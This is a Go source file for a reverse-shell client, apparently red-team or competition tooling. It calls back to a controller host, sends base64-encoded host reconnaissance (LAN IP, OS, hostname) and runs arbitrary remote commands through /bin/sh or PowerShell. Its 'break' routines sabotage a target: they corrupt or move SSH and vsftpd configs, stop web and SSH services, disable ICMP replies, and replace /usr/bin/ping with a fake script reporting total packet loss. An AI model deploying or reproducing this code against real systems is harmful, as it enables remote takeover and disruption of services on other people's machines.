package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

var HOST_IP string = GetIP() //"192.168.3.6"

func main() {
	connectPort := GetPort()
	if connectPort == "-1" {
		return
	}
	EstablishConnection(connectPort)
}

func GetPort() string {
	//Get the reverse shell port from the server
	getPort, err := net.Dial("tcp", HOST_IP+":8003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "-1"
	}
	defer getPort.Close()
	// ip := GetOutboundIP()
	osFlavor := "n/a"
	// TODO: add OS flavor
	if runtime.GOOS == "linux" {
		osFlavor = getOS()
	} else if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "os", "get", "Caption")
		out, _ := cmd.Output()
		osFlavor = string(out)
		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
		cmd.Run()
	}
	hostname, _ := os.Hostname()
	sendStr := b64_encode(
		"clientType:Basic Reverse Shell," +
			"lanIP:" + GetOutboundIP() + "," +
			"isEncoded:true" + "," +
			"os:" + runtime.GOOS + "," +
			"osFlavor:" + osFlavor + "," +
			"hostname:" + hostname,
	)
	it, err := getPort.Write([]byte("ENCODED-INFO:{" + sendStr + "}\n"))
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println(it)
	}
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}
func EstablishConnection(port string) {
	//Establish reverse connection to host
	conn, _ := net.Dial("tcp", HOST_IP+":"+port)
	var cmd *exec.Cmd
	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		command = trim(command)
		command = b64_decode(command)
		args := strings.Split(command, " ")
		if args[0] == "cd" {
			os.Chdir(trim(command[3:]))
			conn.Write([]byte("\n"))
		} else if strings.Contains(args[0], "BREAK:{") {
			breaks := args[0]
			breaks = breaks[strings.Index(breaks, "BREAK:{")+7 : strings.Index(breaks, "}")]
			breakList := strings.Split(breaks, ",")
			for _, brk := range breakList {
				if runtime.GOOS == "linux" {
					brks := strings.Split(brk, ".")
					if len(brks) == 1 {
						brks = append(brks, "")
					}
					switch brks[0] {
					case "ssh":
						switch brks[1] {
						case "alter-config":
							ExecuteList([]string{
								"echo asdf >> /etc/ssh/sshd_config",
								"systemctl restart sshd",
							})
						case "move-config":
							Execute(FormatCommand("mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old"))
						case "break-service":
						default:
							if CheckService("sshd") {
								Execute(FormatCommand("systemctl stop sshd"))
							} else if CheckService("ssh") {
								Execute(FormatCommand("systemctl stop ssh"))
							} else {
								respond("Error: ssh service not found\n", conn)
							}
						}
						respond("SSH disabled.\n", conn)
					case "http":
						switch brks[1] {
						default:
							if CheckService("apache2") {
								Execute(FormatCommand("systemctl stop apache2"))
							}
							if CheckService("httpd") {
								Execute(FormatCommand("systemctl stop httpd"))
							}
							if CheckService("nginx") {
								Execute(FormatCommand("systemctl stop nginx"))
							}
						}
						respond("HTTP disabled.\n", conn)
					case "ftp":
						if CheckService("vsftpd") {
							switch brks[1] {
							// TODO add these
							case "alter-config":
								ExecuteList([]string{
									"echo asdf >> /etc/vsftpd.conf",
									"systemctl restart vsftpd",
								})
								respond("FTP config has been broken.\n", conn)
							case "move-config":
								ExecuteList([]string{
									"mv /etc/vsftpd.conf /etc/vsftpd_old.conf",
									"systemctl restart vsftpd",
								})
								respond("FTP config moved.\n", conn)
							case "break-service":
								ExecuteList([]string{
									"sed -i 's#/usr/sbin/vsftpd#/usr/bin/vsftpd#g' /lib/systemd/system/vsftpd.service",
									"systemctl daemon-reload",
									"systemctl restart vsftpd",
								})
								respond("FTP service file altered.", conn)
							default:
								Execute(FormatCommand("systemctl stop vsftpd"))
								respond("FTP disabled.\n", conn)
							}
						}

					case "icmp":
						switch brks[1] {
						case "out":
							// TODO add this
							newPingFile :=
								"#!/usr/bin/sh\\n" +
									"echo PING $1 ($1) 56(84) bytes of data.\\n" +
									"sleep 5\\n" +
									"echo\\necho \"--- $1 ping statistics ---\"\\n" +
									"echo \"1 packets transmitted, 0 received, 100% packet loss, time 0ms\"\\n" +
									"echo\\necho"
							ExecuteList([]string{
								"mv /usr/bin/ping /usr/bin/fpings",
								"echo -e '" + newPingFile + "' > /usr/bin/ping",
								"chmod +x /usr/bin/ping",
							})
						default:
							Execute(FormatCommand("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
							respond("ICMP Disabled.\n", conn)
						}
					default:
						respond("Error: Break not supported by client\n", conn)
					}
				}
			}
		} else if strings.Contains(args[0], "CMD:{") {
			breaks := args[0]
			breaks = breaks[strings.Index(breaks, "CMD:{")+5 : strings.Index(breaks, "}")]
			breakList := strings.Split(breaks, ",")
			// TODO: continue here
			//respond("Commands not yet implemented", conn)
			for _, brk := range breakList {
				switch brk {
				case "arp":
				case "child":
					respond("Spawned unencoded client\n", conn)
					go unencodedClient()
				}
			}
		} else {
			if runtime.GOOS == "windows" {
				cmd = exec.Command("powershell.exe", command)
			} else {
				cmd = exec.Command("/bin/sh", "-c", FormatCommand(command))
			}
			out, _ := cmd.CombinedOutput()
			respond(string(out), conn)
			cmd.Run()
		}

		// fmt.Println(string(out))

		//Set input/output to the established connection's in/out
	}
}

func CheckService(service string) bool {
	cmd := Execute(FormatCommand("systemctl status " + service))
	if strings.Contains(cmd, "could not be found") {
		return false
	}
	return true
}

func FormatCommand(command string) string {
	return strings.Replace(command, "\"", "\\\"", -1)
}

func ExecuteList(command []string) []string {
	var retComp []string
	for _, c := range command {
		cmd := exec.Command("/bin/sh", "-c", c)
		out, _ := cmd.CombinedOutput()
		cmd.Run()
		retComp = append(retComp, string(out))
	}
	return retComp

}

func Execute(command string) string {
	cmd := exec.Command("/bin/sh", "-c", command)
	out, _ := cmd.CombinedOutput()
	cmd.Run()
	return string(out)
}

func respond(str string, conn net.Conn) {
	str = b64_encode(str) + "\n"
	conn.Write([]byte(str))
}
